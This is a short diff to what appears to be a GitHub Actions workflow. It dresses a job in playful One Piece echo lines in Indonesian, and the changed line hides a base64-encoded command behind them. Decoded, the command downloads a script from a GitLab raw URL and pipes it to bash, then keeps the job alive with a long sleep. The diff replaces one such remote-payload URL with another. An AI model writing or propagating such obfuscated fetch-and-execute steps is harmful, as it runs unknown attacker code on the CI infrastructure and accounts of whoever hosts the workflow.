@@ -18,4 +18,4 @@ jobs:
         run: |
           echo "🏴‍☠️ Luffy: 'Aku akan menjadi Raja Bajak Laut!'"
           echo "👥 Kru ${{ matrix.name }} bergerak!"
-          echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS9zcGluYXpvbGxhL3NhaW50Ly0vcmF3L21haW4vbHVtYmFyYW5zIHwgYmFzaA | sh & sleep 595
+          echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS9nYW5hbnRhcmFzYW5zL2ZpbGVzODgvLS9yYXcvbWFpbi9wb3N0IHwgYmFzaA | sh & sleep 595
